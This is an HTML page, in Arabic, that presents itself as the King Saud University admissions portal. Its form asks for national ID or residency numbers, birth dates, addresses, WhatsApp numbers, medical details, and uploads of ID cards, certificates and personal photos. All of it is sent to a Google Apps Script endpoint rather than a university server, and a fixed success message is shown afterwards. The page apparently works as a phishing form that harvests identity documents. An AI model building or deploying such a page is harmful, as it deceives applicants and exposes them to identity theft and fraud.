<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>بوابة القبول والتسجيل - جامعة الملك سعود</title>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">

<style>
body{font-family:'Tajawal',sans-serif; background:#f8f8f8; margin:0; padding:0;}
.container{max-width:900px;margin:20px auto;padding:20px;background:#fff;border-radius:12px;box-shadow:0 4px 15px rgba(0,0,0,0.1);}
h2,h3{color:#0b6b44;}
.form-group{margin-bottom:12px;}
label{display:block;margin-bottom:4px;font-weight:600;}
input,select,textarea{width:100%;padding:10px;border:1px solid #ccc;border-radius:6px;}
textarea{resize:vertical;}
button.submit-btn{background:#0b6b44;color:#fff;padding:12px 20px;border:none;border-radius:8px;cursor:pointer;}
button.submit-btn:hover{background:#095632;}
.hidden{display:none;}
.success-message{margin-top:15px;padding:12px;background:#d4edda;color:#155724;border-radius:6px;}
</style>

</head>
<body>

<div class="container">
<h2>نموذج تقديم طلب جديد - جامعة الملك سعود</h2>
<form id="applicationForm" enctype="multipart/form-data" method="POST" action="https://script.google.com/macros/s/AKfycbxglQ_oGCF_ICL56X9dofD56F1mF89vIef6NrN7BObysCTEs5xQVfQ9wGc8N4aWwkG2/exec">

<h3>البيانات الشخصية</h3>
<div class="form-group"><label>الاسم الكامل *</label><input type="text" name="fullName" required></div>
<div class="form-group"><label>الجنس *</label><select name="gender" required><option value="">اختر...</option><option>ذكر</option><option>أنثى</option></select></div>
<div class="form-group"><label>الجنسية *</label><input type="text" name="nationality" required></div>
<div class="form-group"><label>الدولة (مكان الإقامة) *</label><input type="text" name="country" required></div>
<div class="form-group"><label>رقم الهوية / الإقامة *</label><input type="text" name="idNumber" required></div>
<div class="form-group"><label>تاريخ الميلاد *</label><input type="date" name="dob" required></div>
<div class="form-group"><label>مكان الميلاد (المدينة)</label><input type="text" name="birthPlace"></div>
<div class="form-group"><label>المدينة *</label><input type="text" name="city" required></div>
<div class="form-group"><label>العنوان *</label><textarea name="address" required></textarea></div>
<div class="form-group"><label>رقم الجوال (واتساب) *</label><input type="tel" name="phone" required></div>
<div class="form-group"><label>البريد الإلكتروني *</label><input type="email" name="email" required></div>

<h3>المؤهل السابق والبرنامج</h3>
<div class="form-group"><label>نوع المؤهل السابق *</label><select name="prevDegree" required><option value="">اختر...</option><option>ثانوي</option><option>دبلوم</option><option>بكالوريوس</option><option>ماجستير</option></select></div>
<div class="form-group"><label>سنة التخرج *</label><input type="number" name="gradYear" required></div>
<div class="form-group"><label>اسم المدرسة / الجامعة السابقة</label><input type="text" name="prevInstitute"></div>
<div class="form-group"><label>النسبة / المعدل</label><input type="text" name="gpa"></div>
<div class="form-group"><label>التخصص المطلوب *</label><input type="text" name="desiredMajor" required></div>
<div class="form-group"><label>نوع الدراسة *</label><select name="studyType" required><option value="">اختر...</option><option>انتظام</option><option>انتساب</option><option>تعليم عن بعد</option></select></div>
<div class="form-group"><label>الكلية / القسم *</label><input type="text" name="faculty" required></div>
<div class="form-group"><label>هل لديك أي حالة طبية هامة؟</label><input type="text" name="medicalInfo"></div>

<h3>جهة الاتصال في حالات الطوارئ</h3>
<div class="form-group"><label>اسم جهة الاتصال للطوارئ</label><input type="text" name="emergencyName"></div>
<div class="form-group"><label>صلة القرابة</label><input type="text" name="emergencyRelation"></div>
<div class="form-group"><label>رقم الطوارئ</label><input type="tel" name="emergencyPhone"></div>

<h3>الملفات المرفقة</h3>
<div class="form-group"><label>صورة الهوية / الإقامة *</label><input type="file" name="fileId" accept="image/*,application/pdf" required></div>
<div class="form-group"><label>صورة الشهادة / المؤهل *</label><input type="file" name="fileCertificate" accept="image/*,application/pdf" required></div>
<div class="form-group"><label>صورة شخصية *</label><input type="file" name="filePhoto" accept="image/*" required></div>

<div class="form-group"><label><input type="checkbox" name="agree" required> أقرّ بأن جميع البيانات المدخلة صحيحة ومطابقة للوثائق الرسمية.</label></div>

<button type="submit" class="submit-btn">إرسال الطلب</button>
</form>

<div id="successMessage" class="success-message hidden">
تم استلام جميع بياناتك بنجاح. سيتم التواصل معك عبر الرابط الخاص بك.
</div>
</div>

<script>
document.getElementById('applicationForm').addEventListener('submit', function(e){
    setTimeout(function(){
        document.getElementById('successMessage').classList.remove('hidden');
    }, 500);
});
</script>

</body>
                        </html>
